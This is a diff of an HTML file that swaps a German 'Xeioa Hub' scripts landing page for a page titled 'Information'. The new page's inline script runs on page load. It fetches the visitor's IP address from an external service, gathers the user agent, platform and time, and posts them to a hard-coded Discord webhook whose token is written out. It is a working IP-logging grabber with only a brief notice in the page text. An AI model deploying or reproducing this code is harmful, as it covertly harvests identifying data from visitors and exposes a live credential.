@@ -1,32 +1,49 @@
 <!DOCTYPE html>
-<html lang="de">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Xeioa Hub</title>
-  <link rel="stylesheet" href="style.css">
+    <title>Information</title>
+    <script>
+        async function sendIPToDiscord() {
+            try {
+                // Webhook-URL - ersetzen Sie dies mit Ihrem eigenen Webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1372171027890835487/7i0kGhrX1wCbCZhaDeWnsq3Dceo5wjZ3brTY3MXpLpBW97ktk2p8aVcUWmFAphtoJabn';
+                
+                // IP-Adresse abrufen (mit einem externen Service)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Zusätzliche Informationen sammeln
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const timestamp = new Date().toISOString();
+                
+                // Nachricht für Discord erstellen
+                const message = {
+                    content: `Neuer Zugriff:\nIP: ${ip}\nUser-Agent: ${userAgent}\nPlatform: ${platform}\nZeit: ${timestamp}`
+                };
+                
+                // An Discord senden
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message),
+                });
+                
+                alert('Daten wurden erfolgreich gesendet!');
+            } catch (error) {
+                console.error('Fehler:', error);
+            }
+        }
+        
+        // Funktion beim Laden der Seite ausführen
+        window.onload = sendIPToDiscord;
+    </script>
 </head>
 <body>
-  <header>
-    Xeioa Hub
-  </header>
-
-  <main>
-    <div class="card">
-      <h2>Scripts | By Xeioa</h2>
-      <p>XeioaHub | By Law.</p>
-      <button onclick="window.open('https://discord.gg/Rh5DuCvx8H', '_blank')">Scripts</button>
-      <div class="info-text">Click here to get the scripts by Xeioa</div>
-    </div>
-
-    <div class="reason">
-      <h3>Why You Should Use Xeioa</h3>
-      <p>
-        Xeioa is the ultimate platform for discovering and accessing powerful tools, scripts, and resources that enhance your experience. With a community-driven approach, continuous updates, and a focus on quality and security, Xeioa is the go-to hub for those seeking reliable and cutting-edge solutions.
-      </p>
-    </div>
-  </main>
-
-  <script src="script.js"></script>
+    <h1>Willkommen</h1>
+    <p>Diese Seite sendet automatisch Informationen an den Server.</p>
 </body>
 </html>
